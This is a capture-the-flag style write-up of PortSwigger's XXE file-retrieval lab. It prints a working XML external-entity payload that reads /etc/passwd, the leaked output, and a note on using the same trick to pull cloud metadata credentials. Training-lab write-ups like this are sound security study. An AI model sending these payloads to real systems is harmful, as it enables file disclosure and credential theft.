# XXE Lab 1 — Exploiting XXE using external entities to retrieve files — PortSwigger

**Platform:** PortSwigger Web Security Academy (free lab)
**Topic:** XXE (XML External Entity Injection)
**Lab:** Exploiting XXE using external entities to retrieve files
**Difficulty:** Apprentice
**Solved:** 27 November 2026 ~03:12 PKT (banner verified on the instance home page)
**Account:** Arbaz Ahmed Naveed

## Vulnerability Type

XML External Entity (XXE) Injection — the shop's stock-check feature parses attacker-supplied XML with external entities enabled, so a crafted DOCTYPE can read local files.

## Solution

1. The stock check submits XML to `POST /product/stock` (`Content-Type: application/xml`).
2. Sent this XML:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
3. The response echoed the file in the error: `Invalid product ID: root:x:0:0:root:/root:/bin/bash...`
4. Home page then showed "Congratulations, you solved the lab!"

## Practical Explanation

- **Why it works:** the XML parser resolves external entities, so `&xxe;` is replaced with the contents of `/etc/passwd` before the application reads `productId`. The application then prints the "product ID" back in its error message — that echo is the leak.
- **The key detail:** the stock-check endpoint expects XML (not a form POST), so the DOCTYPE goes straight into the request body. Anywhere an application parses XML you control, an external entity is a file-read.

## Lessons Learned

- XXE is the XML equivalent of SQL injection: never trust parser defaults — external entities must be disabled when parsing untrusted XML.
- Error messages that echo input are a gift to attackers: the file contents came back in an "Invalid product ID" error, not a success page.

## Next Steps

- Lab 2 (XXE to perform SSRF) — same stock-check XML, entity pointed at the cloud metadata endpoint; answer (SecretAccessKey) goes to Arbaz for the Submit-solution step.
- Next XXE labs: XInclude, local DTD repurposing, error-message retrieval.
